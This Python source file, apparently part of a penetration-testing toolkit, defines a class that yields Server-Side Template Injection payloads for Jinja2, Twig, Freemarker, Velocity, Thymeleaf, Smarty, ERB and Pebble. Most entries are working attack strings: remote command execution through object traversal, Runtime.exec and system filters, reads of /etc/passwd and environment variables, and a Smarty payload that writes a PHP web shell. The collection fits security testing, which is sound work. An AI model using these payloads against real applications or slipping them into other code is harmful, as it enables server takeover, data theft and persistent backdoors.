"""
AIPT Template Injection Payloads

Server-Side Template Injection (SSTI) payloads for security testing.
"""
from __future__ import annotations

from typing import Iterator


class TemplateInjectionPayloads:
    """
    Template injection payload generator.

    Categories:
    - Detection: Identify template engines
    - Jinja2: Python/Flask
    - Twig: PHP/Symfony
    - Freemarker: Java
    - Velocity: Java
    - Thymeleaf: Java/Spring

    Example:
        ssti = TemplateInjectionPayloads()
        for payload in ssti.detection():
            if "49" in response(test(payload)):
                print("SSTI detected!")
    """

    @classmethod
    def detection(cls) -> Iterator[str]:
        """Payloads to detect template injection"""
        payloads = [
            # Math operations (universal)
            "${7*7}",
            "{{7*7}}",
            "#{7*7}",
            "<%= 7*7 %>",
            "${{7*7}}",
            "{7*7}",
            "*{7*7}",

            # String operations
            "${7*'7'}",
            "{{7*'7'}}",

            # Specific engines
            "{{config}}",  # Jinja2
            "${class.getResource('').getPath()}",  # Freemarker
            "#{T(java.lang.System).getenv()}",  # Thymeleaf
        ]
        yield from payloads

    @classmethod
    def jinja2(cls) -> Iterator[str]:
        """Jinja2 (Python/Flask) payloads"""
        payloads = [
            # Basic detection
            "{{7*7}}",
            "{{config}}",
            "{{config.items()}}",
            "{{self}}",

            # Information disclosure
            "{{request}}",
            "{{request.environ}}",
            "{{request.application}}",
            "{{g}}",

            # RCE via object traversal
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{''.__class__.__bases__[0].__subclasses__()}}",

            # RCE via os module
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",

            # RCE via subprocess
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            "{{joiner.__init__.__globals__.os.popen('id').read()}}",

            # RCE via builtins
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",

            # Lipsum (Jinja2 specific)
            "{{lipsum.__globals__.os.popen('id').read()}}",
            "{{lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
        ]
        yield from payloads

    @classmethod
    def twig(cls) -> Iterator[str]:
        """Twig (PHP) payloads"""
        payloads = [
            # Detection
            "{{7*7}}",
            "{{_self}}",
            "{{_self.env}}",
            "{{_context}}",

            # RCE (Twig 1.x)
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",

            # RCE (Twig 2.x/3.x)
            "{{['id']|filter('system')}}",
            "{{['cat /etc/passwd']|filter('system')}}",

            # File read
            "{{'/etc/passwd'|file_excerpt(1,30)}}",
        ]
        yield from payloads

    @classmethod
    def freemarker(cls) -> Iterator[str]:
        """Freemarker (Java) payloads"""
        payloads = [
            # Detection
            "${7*7}",
            "${3*3}",

            # RCE
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            "<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()>${ob(\"java.lang.ProcessBuilder\",\"id\").start()}",

            # File read
            "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path').toURL().openStream().readAllBytes()}",
        ]
        yield from payloads

    @classmethod
    def velocity(cls) -> Iterator[str]:
        """Velocity (Java) payloads"""
        payloads = [
            # Detection
            "#set($x=7*7)${x}",

            # RCE
            "#set($e=\"exp\")",
            "#set($a=$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\"))",
            "#set($input=$a.getInputStream())",
            "#set($sc = $e.getClass().forName(\"java.util.Scanner\"))",
            "#set($reader=$sc.getConstructor($input.getClass()).newInstance($input))",
            "$reader.useDelimiter(\"\\\\A\").next()",
        ]
        yield from payloads

    @classmethod
    def thymeleaf(cls) -> Iterator[str]:
        """Thymeleaf (Java/Spring) payloads"""
        payloads = [
            # Detection
            "${7*7}",
            "*{7*7}",
            "#{7*7}",

            # RCE via SpEL
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "*{T(java.lang.Runtime).getRuntime().exec('calc')}",

            # Environment access
            "${T(java.lang.System).getenv()}",
            "${#ctx.environment}",
        ]
        yield from payloads

    @classmethod
    def smarty(cls) -> Iterator[str]:
        """Smarty (PHP) payloads"""
        payloads = [
            # Detection
            "{$smarty.version}",
            "{7*7}",

            # RCE
            "{php}echo `id`;{/php}",
            "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",

            # Smarty 3.x
            "{system('id')}",
        ]
        yield from payloads

    @classmethod
    def erb(cls) -> Iterator[str]:
        """ERB (Ruby) payloads"""
        payloads = [
            # Detection
            "<%= 7*7 %>",

            # RCE
            "<%= system('id') %>",
            "<%= `id` %>",
            "<%= IO.popen('id').readlines() %>",
            "<%= require 'open3'; Open3.capture3('id') %>",

            # File read
            "<%= File.read('/etc/passwd') %>",
        ]
        yield from payloads

    @classmethod
    def pebble(cls) -> Iterator[str]:
        """Pebble (Java) payloads"""
        payloads = [
            # Detection
            "{{7*7}}",

            # RCE
            "{% set cmd = 'id' %}{{ cmd.getClass().forName('java.lang.Runtime').getRuntime().exec(cmd) }}",
        ]
        yield from payloads

    @classmethod
    def all(cls) -> Iterator[str]:
        """All template injection payloads"""
        yield from cls.detection()
        yield from cls.jinja2()
        yield from cls.twig()
        yield from cls.freemarker()
        yield from cls.velocity()
        yield from cls.thymeleaf()
        yield from cls.smarty()
        yield from cls.erb()
